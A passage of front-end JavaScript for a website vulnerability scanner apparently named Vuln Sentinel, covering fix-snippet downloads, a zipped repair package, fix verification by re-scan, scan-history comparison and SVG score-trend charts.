    let tab = document.getElementById(prefix + 'tab-' + p);
    let content = document.getElementById(prefix + 'content-' + p);
    if (tab && content) {
      if (p === platform) {
        tab.style.background = 'var(--primary)';
        tab.style.color = '#fff';
        tab.style.borderColor = 'var(--primary)';
        content.style.display = 'block';
      } else {
        tab.style.background = 'transparent';
        tab.style.color = 'var(--text-secondary)';
        tab.style.borderColor = 'var(--border)';
        content.style.display = 'none';
      }
    }
  });
}

// ----- _fixesToText -----
function _fixesToText(items) {
  if (!Array.isArray(items)) return '';
  return items.map(function(item) {
    if (typeof item === 'string') return item;
    if (item && typeof item === 'object') return item.code || '';
    return String(item);
  }).join('\n\n');
}

// ----- copyFixCodeByLang -----
function copyFixCodeByLang(lang) {
  if (!lastFixResult) return;
  let code = _fixesToText(lastFixResult[lang] || []);
  copyToClipboard(code);
  showToast('已复制 ' + lang + ' 修复代码');
}

// ----- downloadFixCode -----
function downloadFixCode(lang) {
  if (!lastFixResult) return;
  let code = _fixesToText(lastFixResult[lang] || []);
  let ext = { nginx: 'conf', python: 'py', nodejs: 'js', apache: 'conf' };
  let filename = 'security-fix.' + (ext[lang] || 'txt');
  let blob = new Blob([code], { type: 'text/plain' });
  let url = URL.createObjectURL(blob);
  let a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
  showToast('已下载 ' + filename);
}

// ----- downloadAllFixes -----
async function downloadAllFixes() {
  if (!lastScanResult) { showToast('请先完成扫描'); return; }
  // 优先使用已生成的 lastFixResult；若不存在则本地生成
  let fixes = lastFixResult || generateLocalFixes(lastScanResult.findings);
  let platformNames = { nginx: 'Nginx', apache: 'Apache', express: 'Express', flask: 'Flask/FastAPI', spring_boot: 'Spring Boot', cloudflare: 'Cloudflare', python: 'Python', nodejs: 'Node.js' };
  let platformOrder = ['nginx', 'apache', 'express', 'flask', 'spring_boot', 'cloudflare', 'python', 'nodejs'];
  let zip = new JSZip();
  let manifest = {
    product: 'Vuln Sentinel',
    package_type: 'repair_configuration_package',
    target: lastScanResult.url || '',
    generated_at: new Date().toISOString(),
    generated_at_local: new Date().toLocaleString('zh-CN'),
    scan_id: lastScanResult.scan_id || null,
    score: typeof lastScanResult.score === 'number' ? lastScanResult.score : null,
    findings: Array.isArray(lastScanResult.findings) ? lastScanResult.findings.length : 0,
    version: 'Vuln Sentinel'
  };
  zip.file('manifest.json', JSON.stringify(manifest, null, 2));
  zip.file('README.txt', [
    'Vuln Sentinel 修复配置包',
    '目标: ' + (lastScanResult.url || ''),
    '生成时间: ' + new Date().toLocaleString('zh-CN'),
    '',
    '内容结构:',
    '- manifest.json: 包信息与扫描摘要',
    '- README.txt: 使用说明',
    '- 各平台 .txt: 对应平台的修复片段',
    '',
    '说明:',
    '- 如果某个平台文件为空，表示当前扫描结果暂未生成对应配置',
    '- 请优先查看报告中的漏洞证据和修复说明'
  ].join('\n'));
  let hasContent = false;
  platformOrder.forEach(function(p) {
    let arr = fixes && fixes[p] ? fixes[p] : [];
    let content = arr.length === 0 ? '暂无适用配置片段\n' : _fixesToText(arr) + '\n';
    if (arr.length > 0) hasContent = true;
    zip.file(p + '.txt', content);
  });
  if (!hasContent) {
    zip.file('USAGE.txt', '当前扫描结果没有直接生成平台配置片段。请先查看报告中的漏洞证据与建议，再重新生成修复包。\n');
  }
  let blob = await zip.generateAsync({ type: 'blob' });
  let url = URL.createObjectURL(blob);
  let a = document.createElement('a');
  a.href = url;
  a.download = 'vuln-sentinel-fixes-' + getHost(lastScanResult.url) + '.zip';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
  showToast('修复配置包已下载');
}

// ----- verifyFix -----
function verifyFix() {
  if (!lastScanResult) { showToast('请先完成扫描'); return; }
  let url = lastScanResult.url;
  if (!url) { showToast('无法获取扫描 URL'); return; }
  let btn = document.getElementById('verify-fix-btn');
  if (btn) { btn.disabled = true; btn.textContent = '验证中...'; }
  showToast('正在重新扫描验证修复效果...');
  authFetch('/api/verify-fix', {
    method: 'POST',
    body: JSON.stringify({ url: url })
  }).then(function(resp) {
    if (resp.status === 402) {
      return resp.json().then(function(data) { data._status = 402; return data; });
    }
    if (!resp.ok) throw new Error('接口返回 ' + resp.status);
    return resp.json();
  }).then(function(data) {
    if (btn) { btn.disabled = false; btn.textContent = '验证修复效果'; }
    if (isPaymentRequired(data)) {
      showToast(paymentRequiredMessage(data), 'error');
      updateUserCredits();
      return;
    }
    if (data.success) {
      let oldScore = lastScanResult.score;
      let newScore = data.new_score;
      let msg = '重新扫描完成！评分: ' + oldScore + ' → ' + newScore;
      if (newScore > oldScore) {
        msg += ' (提升 ' + (newScore - oldScore) + ' 分)';
      } else if (newScore < oldScore) {
        msg += ' (下降 ' + (oldScore - newScore) + ' 分)';
      } else {
        msg += ' (无变化)';
      }
      showToast(msg);
      // 计算已修复的问题
      let oldNames = (lastScanResult.findings || []).map(function(f) { return f.name; });
      let newNames = (data.new_findings || []).map(function(f) { return f.name; });
      let fixedCount = oldNames.filter(function(n) { return newNames.indexOf(n) === -1; }).length;
      if (fixedCount > 0) {
        showToast('已修复 ' + fixedCount + ' 个安全问题');
      }
      // 合并新数据并更新
      let merged = Object.assign({}, lastScanResult, {
        score: data.new_score,
        risk_level: data.new_risk_level,
        findings: data.new_findings
      });
      lastScanResult = merged;
      renderResult(merged);
      navigateTo('result');
      updateUserCredits();
    } else {
      showToast('验证失败: ' + extractError(data), 'error');
    }
  }).catch(function(e) {
    if (btn) { btn.disabled = false; btn.textContent = '验证修复效果'; }
    showToast('验证扫描出错: ' + e.message, 'error');
  });
}

// ----- saveScanHistory -----
function saveScanHistory(data) {
  // 扫描结果已由后端保存到数据库（按用户隔离），无需本地存储
  updateProfileStats();
}

// ----- clearScanHistory -----
function clearScanHistory() {
  if (!confirm("确定要清空所有扫描历史吗？此操作不可恢复。")) return;
  authFetch('/api/history', { method: 'DELETE' })
    .then(function(r) { return r.json(); })
    .then(function(data) {
      showToast('已清空 ' + (data.deleted || 0) + ' 条扫描历史');
      updateProfileStats();
      renderScanHistory();
    })
    .catch(function() {
      showToast('清空失败，请检查网络', 'error');
    });
}

// ----- toggleHistoryCompareMode -----
function toggleHistoryCompareMode() {
  _history对比Mode = !_history对比Mode;
  _history对比Selected = [];
  let bar = document.getElementById('history-compare-bar');
  if (bar) bar.style.display = _history对比Mode ? 'flex' : 'none';
  updateHistoryCompareUI();
  renderScanHistory(historyPage);
}

// ----- cancelHistoryCompare -----
function cancelHistoryCompare() {
  _history对比Mode = false;
  _history对比Selected = [];
  let bar = document.getElementById('history-compare-bar');
  if (bar) bar.style.display = 'none';
  renderScanHistory(historyPage);
}

// ----- onHistorySelect -----
function onHistorySelect(idx) {
  let pos = _history对比Selected.indexOf(idx);
  if (pos >= 0) {
    _history对比Selected.splice(pos, 1);
  } else {
    if (_history对比Selected.length >= 2) {
      showToast('最多选择 2 条记录进行对比');
      return;
    }
    _history对比Selected.push(idx);
  }
  updateHistoryCompareUI();
  renderScanHistory(historyPage);
}

// ----- updateHistoryCompareUI -----
function updateHistoryCompareUI() {
  let count = document.getElementById('history-compare-count');
  let btn = document.getElementById('history-compare-btn');
  if (count) count.textContent = String(_history对比Selected.length);
  if (btn) btn.disabled = _history对比Selected.length !== 2;
}

// ----- doHistoryCompare -----
function doHistoryCompare() {
  if (_history对比Selected.length !== 2) { showToast('请选择 2 条记录'); return; }
  authFetch('/api/history?limit=50').then(function(r){return r.json();}).then(function(data){
    let history = data.history || [];
    let a = history[_history对比Selected[0]];
    let b = history[_history对比Selected[1]];
    if (!a || !b) { showToast('记录不存在'); return; }
    let diff = compareHistoryItems(a, b);
    let html = '<div class="card" style="margin-bottom:16px">';
    html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">';
    html += '<div class="card-title"> 历史对比</div>';
    html += '<button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px" onclick="cancelHistoryCompare()">关闭</button>';
    html += '</div>';
    html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px">';
    html += '<div style="background:var(--bg);border-radius:2px;padding:10px;text-align:center">';
    html += '<div style="font-size:12px;color:var(--text-secondary)">' + escapeHtml(a.created_at || a.time || '') + '</div>';
    html += '<div style="font-size:24px;font-weight:800;color:' + getScoreColor(a.score) + '">' + (a.score || 0) + '</div>';
    html += '</div>';
    html += '<div style="background:var(--bg);border-radius:2px;padding:10px;text-align:center">';
    html += '<div style="font-size:12px;color:var(--text-secondary)">' + escapeHtml(b.created_at || b.time || '') + '</div>';
    html += '<div style="font-size:24px;font-weight:800;color:' + getScoreColor(b.score) + '">' + (b.score || 0) + '</div>';
    html += '</div>';
    html += '</div>';
    html += '<div style="font-size:13px;margin-bottom:8px">分数变化：' + (diff.scoreDelta > 0 ? '+' : '') + diff.scoreDelta + ' ' + (diff.scoreDelta > 0 ? '' : diff.scoreDelta < 0 ? '' : '->') + '</div>';
    if (diff.newIssues.length) {
      html += '<div style="font-size:12px;color:var(--danger);margin-bottom:6px">新增问题（' + diff.newIssues.length + '）</div>';
      diff.newIssues.forEach(function(f){ html += '<div style="font-size:12px;padding:4px 8px;background:rgba(199,84,80,0.08);border-radius:2px;margin-bottom:4px">' + escapeHtml(f.name || f) + '</div>'; });
    }
    if (diff.fixedIssues.length) {
      html += '<div style="font-size:12px;color:var(--success);margin-bottom:6px;margin-top:8px"> 已修复问题（' + diff.fixedIssues.length + '）</div>';
      diff.fixedIssues.forEach(function(f){ html += '<div style="font-size:12px;padding:4px 8px;background:rgba(115,201,144,0.08);border-radius:2px;margin-bottom:4px">' + escapeHtml(f.name || f) + '</div>'; });
    }
    if (!diff.newIssues.length && !diff.fixedIssues.length) {
      html += '<div style="font-size:12px;color:var(--text-secondary);text-align:center">两次扫描结果一致，无变化</div>';
    }
    html += '</div>';
    let list = safeGetElement('scan-history-list');
    if (list) list.innerHTML = html;
    safeSetDisplay('history-pagination', 'none');
  }).catch(function(){ showToast('加载失败'); });
}

// ----- compareHistoryItems -----
function compareHistoryItems(a, b) {
  let a漏洞项 = (a.findings || []).map(function(f){ return f.name || f; });
  let b漏洞项 = (b.findings || []).map(function(f){ return f.name || f; });
  let newIssues = [];
  let fixedIssues = [];
  b漏洞项.forEach(function(name){ if (a漏洞项.indexOf(name) === -1) newIssues.push({name:name}); });
  a漏洞项.forEach(function(name){ if (b漏洞项.indexOf(name) === -1) fixedIssues.push({name:name}); });
  return { scoreDelta: (b.score || 0) - (a.score || 0), newIssues: newIssues, fixedIssues: fixedIssues };
}

// ----- renderHistoryTrendChart -----
function renderHistoryTrendChart(history) {
  let wrap = document.getElementById('history-trend-wrap');
  let container = document.getElementById('history-trend-chart');
  if (!wrap || !container) return;
  let recent = history.slice(0, 5).reverse();
  if (recent.length < 2) { wrap.style.display = 'none'; return; }
  wrap.style.display = 'block';
  let w = container.clientWidth || 300;
  let h = 60;
  let pad = 4;
  let max评分 = 100;
  let points = recent.map(function(item, i) {
    let x = pad + (i / (recent.length - 1)) * (w - pad * 2);
    let y = h - pad - ((item.score || 0) / max评分) * (h - pad * 2);
    return { x: Math.round(x), y: Math.round(y), score: item.score || 0 };
  });
  let svg = '<svg width="' + w + '" height="' + h + '" style="overflow:visible">';
  // 网格线
  svg += '<line x1="' + pad + '" y1="' + (h/2) + '" x2="' + (w-pad) + '" y2="' + (h/2) + '" stroke="var(--border)" stroke-width="1" stroke-dasharray="2,2"/>';
  // 折线
  let d = points.map(function(p, i){ return (i===0?'M':'L') + p.x + ',' + p.y; }).join(' ');
  svg += '<path d="' + d + '" fill="none" stroke="var(--primary)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>';
  // 点
  points.forEach(function(p) {
    let color = p.score >= 75 ? '#73c990' : p.score >= 50 ? '#f0a732' : '#c75450';
    svg += '<circle cx="' + p.x + '" cy="' + p.y + '" r="3" fill="' + color + '"/>';
  });
  svg += '</svg>';
  container.innerHTML = svg;
}

// ----- renderScanHistory -----
function renderScanHistory(page) {
  page = page || 1;
  historyPage = page;
  let list = safeGetElement('scan-history-list');
  if (!list) return;
  if (!isLoggedIn()) {
    list.innerHTML = '<p style="text-align:center;color:var(--text-lighter);padding:20px 0">请先登录查看扫描历史</p>';
    safeSetDisplay('history-pagination', 'none');
    return;
  }
  // 从后端加载历史记录
  list.innerHTML = '<p style="text-align:center;color:var(--text-lighter);padding:20px 0">正在读取扫描历史...</p>';
  authFetch('/api/history?limit=50').then(function(resp) { return resp.json(); }).then(function(data) {
    let history = data.history || [];
    if (history.length === 0) {
      list.innerHTML = '<div style="text-align:center;color:var(--text-lighter);padding:30px 0"><div style="font-size:13px">暂无扫描记录</div><div style="font-size:12px;margin-top:6px">点首页「开始扫描」试试</div><div style="margin-top:12px"><button class="fixer-btn primary" onclick="navigateTo(\'scan\')">开始扫描</button></div></div>';
      safeSetDisplay('history-pagination', 'none');
      let tw = document.getElementById('history-trend-wrap');
      if (tw) tw.style.display = 'none';
      return;
    }
    renderHistoryTrendChart(history);
    let totalPages = Math.ceil(history.length / historyPageSize);
    let start = (page - 1) * historyPageSize;
    let pageItems = history.slice(start, start + historyPageSize);
    let html = '';
    if (!_history对比Mode) {
      html += '<div style="text-align:right;margin-bottom:8px">';
      html += '<button class="fixer-btn secondary" style="height:28px;padding:0 10px;font-size:12px" onclick="toggleHistoryCompareMode()"> 对比模式</button>';
      html += '</div>';
    }
    pageItems.forEach(function(h, i) {
      let realIndex = start + i;
      let color = h.score >= 75 ? 'var(--success)' : h.score >= 50 ? 'var(--warning)' : 'var(--danger)';
      let prev评分 = (history[realIndex + 1] || {}).score;
      let arrow = '';
      if (typeof prev评分 === 'number') {
        arrow = (h.score || 0) > prev评分 ? ' <span style="color:var(--success);font-size:12px"></span>' : (h.score || 0) < prev评分 ? ' <span style="color:var(--danger);font-size:12px"></span>' : ' <span style="color:var(--text-lighter);font-size:12px">-></span>';
      }
      if (_history对比Mode) {
        let checked = _history对比Selected.indexOf(realIndex) >= 0 ? 'checked' : '';
        html += '<label class="menu-item" style="margin-bottom:6px;cursor:pointer;display:flex;align-items:center;gap:10px">';
        html += '<input type="checkbox" ' + checked + ' onchange="onHistorySelect(' + realIndex + ')" style="width:16px;height:16px;accent-color:var(--primary)">';
        html += '<div style="flex:1">';
        html += '<div style="font-weight:600;font-size:14px">' + escapeHtml(h.url || h.host || '') + '</div>';
        html += '<div style="font-size:12px;color:var(--text-light)">' + escapeHtml(h.created_at || h.time || '') + ' &middot; 发现 ' + (h.findings_count || 0) + ' 个问题</div>';
        html += '</div>';
        html += '<div style="font-size:20px;font-weight:800;color:' + color + '">' + (h.score || 0) + arrow + '</div>';
        html += '</label>';
      } else {
        html += '<div class="menu-item" style="margin-bottom:6px;cursor:pointer" onclick="restoreScanFromHistory(' + realIndex + ')" role="button" tabindex="0" aria-label="恢复 ' + escapeHtml(h.url || h.host || '') + ' 的扫描结果">';
        html += '<div style="flex:1">';
        html += '<div style="font-weight:600;font-size:14px">' + escapeHtml(h.url || h.host || '') + '</div>';
        html += '<div style="font-size:12px;color:var(--text-light)">' + escapeHtml(h.created_at || h.time || '') + ' &middot; 发现 ' + (h.findings_count || 0) + ' 个问题</div>';
        html += '</div>';
        html += '<div style="font-size:20px;font-weight:800;color:' + color + '">' + (h.score || 0) + arrow + '</div>';
        html += '</div>';
      }
    });
    list.innerHTML = html;
    renderPagination('history-pagination', page, totalPages, 'renderScanHistory');
  }).catch(function() {
    list.innerHTML = '<p style="text-align:center;color:var(--danger);padding:20px 0">加载失败，请检查网络</p>';
  });
}

// ----- restoreScanFromHistory -----
function restoreScanFromHistory(index) {
  // 从后端重新获取历史记录详情
  authFetch('/api/history?limit=50').then(function(resp) { return resp.json(); }).then(function(data) {
    let history = data.history || [];
    if (!history[index]) return;
    let h = history[index];
    // 重新扫描该 URL 获取最新数据
    navigateTo('scan');
    let urlInput = document.getElementById('scan-url');
    if (urlInput) urlInput.value = h.url || '';
    showToast('已填入历史网址，点击"下一步"重新扫描');
  }).catch(function() {
    showToast('加载历史记录失败');
  });
}

// ----- updateProfileStats -----
function updateProfileStats() {
  if (!isLoggedIn()) {
    safeSetText('stat-scan-count', '0');
    safeSetText('stat-avg-score', '-');
    safeSetText('stat-fixed-count', '0');
    return;
  }
  authFetch('/api/history?limit=50').then(function(resp) { return resp.json(); }).then(function(data) {
    let history = data.history || [];
    let stats = data.stats || { scan_count: history.length, fixed_count: 0 };
    let scanCount = document.getElementById('stat-scan-count');
    let avg评分 = document.getElementById('stat-avg-score');
    let fixedCount = document.getElementById('stat-fixed-count');
    if (scanCount) scanCount.textContent = stats.scan_count || history.length;
    if (avg评分) {
      if (history.length === 0) {
        avg评分.textContent = '-';
      } else {
        let sum = history.reduce(function(a, b) { return a + (b.score || 0); }, 0);
        avg评分.textContent = Math.round(sum / history.length);
      }
    }
    // 已修复数：取后端真实统计（同 URL 的相邻两次扫描 diff 累计）
    if (fixedCount) fixedCount.textContent = stats.fixed_count || 0;
  }).catch(function() {});
}


// ===== Window exports for inline onclick =====
window.startScanDirect = startScanDirect;
window.startScan = startScan;
window.updateScanStartState = updateScanStartState;
window.dismissHomeOnboarding = dismissHomeOnboarding;
window.goVerifyStep2 = goVerifyStep2;
window.cancelScan = cancelScan;
window.quickDemo = quickDemo;
window.showFullScanDetail = showFullScanDetail;
window.downloadReport = downloadReport;
window.toggleReportDropdown = toggleReportDropdown;
window.showBatchScanModal = showBatchScanModal;
window.closeBatchScanModal = closeBatchScanModal;
window.doBatchScan = doBatchScan;
window.copyToken = copyToken;
window.selectVerifyMethod = selectVerifyMethod;
window.confirmVerification = confirmVerification;
window.skipVerification = skipVerification;
window.loadPublicDemo = loadPublicDemo;
window.goToFixerWithScanResult = goToFixerWithScanResult;
window.switchFixLang = switchFixLang;
window.clearScanHistory = clearScanHistory;
window.cancelHistoryCompare = cancelHistoryCompare;
window.doHistoryCompare = doHistoryCompare;
window.addMonitorTarget = addMonitorTarget;
window.scanRedirectTarget = scanRedirectTarget;
window.copyFixCode = copyFixCode;
window.renderResult = renderResult;
window.selectFinding = selectFinding;
window.toggleFinding = toggleFinding;
window.shareResult = shareResult;
window.showPdfDownloadTip = showPdfDownloadTip;
window.restoreScanFromHistory = restoreScanFromHistory;
window.updateProfileStats = updateProfileStats;
window.renderScanHistory = renderScanHistory;
window.renderMonitorTargets = renderMonitorTargets;
window.renderHistoryTrendChart = renderHistoryTrendChart;
window.toggleHistoryCompareMode = toggleHistoryCompareMode;
window.onHistorySelect = onHistorySelect;
window.removeMonitorTarget = removeMonitorTarget;
window.generateFixFromResult = generateFixFromResult;
window.verifyFix = verifyFix;
window.downloadAllFixes = downloadAllFixes;
window.downloadFixCode = downloadFixCode;
window.copyFixCodeByLang = copyFixCodeByLang;
window.switchFixPlatform = switchFixPlatform;
window.switchPublicFixTab = switchPublicFixTab;
window.doPublicDemoFix = doPublicDemoFix;
window.renderFixComparison = renderFixComparison;
window.showAutoFixDialog = showAutoFixDialog;
window.closeAutoFixDialog = closeAutoFixDialog;
window.executeAutoFix = executeAutoFix;
window.retryScan = retryScan;
window.retryScanWithUrl = retryScanWithUrl;
window.backToScanInput = backToScanInput;
window.calculateScore = calculateScore;
window.loadDashboard = loadDashboard;
window.loadTrend = loadTrend;
window.drawTrendChart = drawTrendChart;
window.renderRadarChart = renderRadarChart;
window.buildRadarSvg = buildRadarSvg;
window.animateScoreProgress = animateScoreProgress;
window.simulateCSRF = simulateCSRF;
window.simulateXSS = simulateXSS;
window.simulateClickjacking = simulateClickjacking;
window.updateStage = updateStage;
window.animateStages = animateStages;
window.finishStages = finishStages;
window.startProgressAnimation = startProgressAnimation;
window.stopProgressAnimation = stopProgressAnimation;
window.setScanProgress = setScanProgress;
window.updateScanCreditsHint = updateScanCreditsHint;
window.loadTrendChart = function(days) {
  days = days || 30;
  let container = document.getElementById('trend-chart');
  if (!container) return;

  // 更新按钮高亮
  document.querySelectorAll('.trend-range').forEach(function(btn) {
    let active = parseInt(btn.getAttribute('data-days'), 10) === days;
    btn.style.background = active ? '#4b6eaf' : '#45494a';
    btn.style.color = active ? '#fff' : '#808080';
    btn.style.borderColor = active ? '#4b6eaf' : '#555555';
  });

  // 按时间过滤：只保留最近 N 天
  let cutoff = new Date();
  cutoff.setDate(cutoff.getDate() - days);
  cutoff.setHours(0, 0, 0, 0);

  apiGet('/api/trend?limit=' + days).then(function(data) {
    if (!data || !data.success) {
      container.innerHTML = '<span>暂无趋势数据</span>';
      return;
    }
    let series = data.data && data.data.series ? data.data.series : {};
    let urls = Object.keys(series);
    if (urls.length === 0) {
      container.innerHTML = '<span>扫描几个目标后，即可查看分数变化趋势。</span>';
      return;
    }

    // 汇总所有 URL 在最近 N 天的扫描点，按日期取平均分
    let daily = {};
    let totalPoints = 0;
    urls.forEach(function(url) {
      (series[url] || []).forEach(function(p) {
        let t = p.time ? p.time.replace(' ', 'T') : '';
        let d = new Date(t);
        if (!d || isNaN(d.getTime())) return;
        if (d < cutoff) return;
        totalPoints++;
        let key = t.split('T')[0];
        if (!daily[key]) daily[key] = { sum: 0, count: 0 };
        daily[key].sum += (typeof p.score === 'number' ? p.score : parseInt(p.score, 10) || 0);
        daily[key].count++;
      });
    });

    if (totalPoints === 0) {
      container.innerHTML = '<span>扫描几个目标后，即可查看分数变化趋势。</span>';
      return;
    }

    let labels = Object.keys(daily).sort();
    let points = labels.map(function(k) {
      return Math.round(daily[k].sum / daily[k].count);
    });

    container.innerHTML = buildTrendSvg(points, labels, days);
  }).catch(function(e) {
    container.innerHTML = '<span>加载趋势失败，请稍后重试</span>';
  });
};

function buildTrendSvg(points, labels, days) {
  if (!points || points.length === 0) return '<span>暂无数据</span>';
  let W = 640, H = 120, pad = { top: 10, right: 10, bottom: 24, left: 30 };
  let cw = W - pad.left - pad.right;
  let ch = H - pad.top - pad.bottom;
  let min = Math.max(0, Math.min.apply(null, points) - 5);
  let max = Math.min(100, Math.max.apply(null, points) + 5);
  let range = max - min || 1;

  function x(i) { return pad.left + (i / (points.length - 1 || 1)) * cw; }
  function y(v) { return pad.top + ch - ((v - min) / range) * ch; }

  let path = 'M' + points.map(function(v, i) { return x(i).toFixed(1) + ' ' + y(v).toFixed(1); }).join(' L');
  let area = path + ' L' + x(points.length - 1).toFixed(1) + ' ' + (H - pad.bottom).toFixed(1) +
             ' L' + x(0).toFixed(1) + ' ' + (H - pad.bottom).toFixed(1) + ' Z';
  let dots = points.map(function(v, i) {
    return '<circle cx="' + x(i).toFixed(1) + '" cy="' + y(v).toFixed(1) + '" r="2.5" fill="#4b6eaf"/>';
  }).join('');

  // 底部日期标签：只显示首尾
  let startLabel = labels[0] ? labels[0].slice(5) : '';
  let endLabel = labels[labels.length - 1] ? labels[labels.length - 1].slice(5) : '';

  // 当前值标签
  let last = points[points.length - 1];
  let lastX = x(points.length - 1);
  let lastY = y(last);
  let labelBg = '<rect x="' + (lastX - 16) + '" y="' + (lastY - 18) + '" width="32" height="14" rx="2" fill="#4b6eaf"/>';
  let labelText = '<text x="' + lastX + '" y="' + (lastY - 8) + '" text-anchor="middle" font-size="9" fill="#fff">' + last + '</text>';

  return '<svg viewBox="0 0 ' + W + ' ' + H + '" style="width:100%;height:100%">' +
    '<defs><linearGradient id="trendGrad" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#4b6eaf" stop-opacity="0.35"/><stop offset="100%" stop-color="#4b6eaf" stop-opacity="0.05"/></linearGradient></defs>' +
    '<rect x="' + pad.left + '" y="' + pad.top + '" width="' + cw + '" height="' + ch + '" fill="rgba(0,0,0,0.1)" rx="2"/>' +
    '<path d="' + area + '" fill="url(#trendGrad)"/>' +
    '<path d="' + path + '" fill="none" stroke="#4b6eaf" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>' +
    dots +
    labelBg + labelText +
    '<text x="' + pad.left + '" y="' + (H - 6) + '" font-size="10" fill="#808080">' + escapeHtml(startLabel) + '</text>' +
    '<text x="' + (W - pad.right) + '" y="' + (H - 6) + '" text-anchor="end" font-size="10" fill="#808080">' + escapeHtml(endLabel) + '</text>' +
    '</svg>';
}

// ===== ES module exports =====
export {
  loadDashboard,
  loadTrend,
  drawTrendChart,
  renderRadarChart,
  buildRadarSvg,
  animateScoreProgress,
  getMonitorTargets,
  saveMonitorTargets,
  addMonitorTarget,
  removeMonitorTarget,
  renderMonitorTargets,
  downloadReport,
  downloadPdfReport,
  toggleReportDropdown,
  closeReportDropdownOutside,
  loadPublicDemo,
  renderDemoReport,
  switchPublicFixTab,
  doPublicDemoFix,
  renderFixComparison,
  showAutoFixDialog,
  closeAutoFixDialog,
  executeAutoFix,
  showBatchScanModal,
  closeBatchScanModal,
  doBatchScan,
  startScanDirect,
  startScan,
  startRealScan,
  cancelScan,
  copyFixCode,
  quickDemo,
  showFullScanDetail,
  goVerifyStep2,
  selectVerifyMethod,
  skipVerification,
  confirmVerification,
  copyToken,
  calculateScore,
  mergeRealData,
  renderScanError,
  retryScanWithUrl,
  backToScanInput,
  retryScan,
  updateStage,
  animateStages,
  finishStages,
  startProgressAnimation,
  stopProgressAnimation,
  setScanProgress,
  renderResult,
  scanRedirectTarget,
  shareResult,
  showPdfDownloadTip,
  selectFinding,
  toggleFinding,
  generateFixFromResult,
  generateFixFromFindings,
  goToFixerWithScanResult,
  generateLocalFixes,
  renderFixResult,
  switchFixLang,
  switchFixPlatform,
  _fixesToText,
  copyFixCodeByLang,
  downloadFixCode,
  downloadAllFixes,
  verifyFix,
  saveScanHistory,
  clearScanHistory,
  toggleHistoryCompareMode,
  cancelHistoryCompare,
  onHistorySelect,
  updateHistoryCompareUI,
  doHistoryCompare,
  compareHistoryItems,
  renderHistoryTrendChart,
  renderScanHistory,
  restoreScanFromHistory,
  updateProfileStats,
  simulateCSRF,
  simulateXSS,
  simulateClickjacking,
  dismissHomeOnboarding,
  showHomeOnboarding,
};


window.addEventListener('load', function() {
  refreshScanStartStateSoon();
  let scanUrl = document.getElementById('scan-url');
  if (scanUrl) scanUrl.addEventListener('input', refreshScanStartStateSoon);
  let authStep1 = document.getElementById('auth-check-step1');
  if (authStep1) authStep1.addEventListener('change', refreshScanStartStateSoon);
  let authStep3 = document.getElementById('auth-check');
  if (authStep3) authStep3.addEventListener('change', refreshScanStartStateSoon);
});


